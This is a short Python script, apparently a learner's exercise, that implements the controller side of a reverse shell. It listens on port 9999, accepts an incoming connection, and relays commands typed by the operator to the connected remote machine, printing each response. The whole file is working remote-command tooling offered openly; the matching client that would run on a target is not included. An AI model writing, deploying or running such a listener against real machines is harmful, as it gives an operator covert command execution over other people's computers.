# reverse shell
import socket
import sys

def create_socket():
    try:
        global host
        global port 
        global s  #socket
        host = '' 
        port = 9999 # not used as often, hence using unused ports
        s = socket.socket() # socket created
    except socket.error as msg:
        print("creation error" + str(msg))

# now to bind socket to port and host
def bind_socket():
    try:
        global host
        global port
        global s

        print(f"binding to port {port}")
        s.bind((host,port))
        s.listen(5)
    except socket.error as msg:
        print("bind error" + str(msg))
        bind_socket() # recursive call, repeat the function

# accept connection from client
def socket_accept():
    conn,address = s.accept()
    # won't move forward till connection is established
    print(conn,address)
    print("conn established")
    # use conn to run commands on another pc 
    send_command(conn)
    conn.close() # close connection 
    

def send_command(conn):
    while True:
        # infinite loop like a menu
        cmd = input("Enter command:")
        if cmd == "bye":
            conn.close()
            s.close()
            sys.exit()
            # kills socket, connection and terminal
            # to send data command has to be sent as a byte not text
        if len(str.encode(cmd)) > 0:
                # check for if anything is typed in since it has to be more than nothing so that its larger than 0
                conn.send(str.encode(cmd)) # sends encoded command
                client_response = str(conn.recv(1024),"utf-8") # converts response to str
                print(client_response, end="")


def main():
    create_socket()
    bind_socket()
    socket_accept()

main()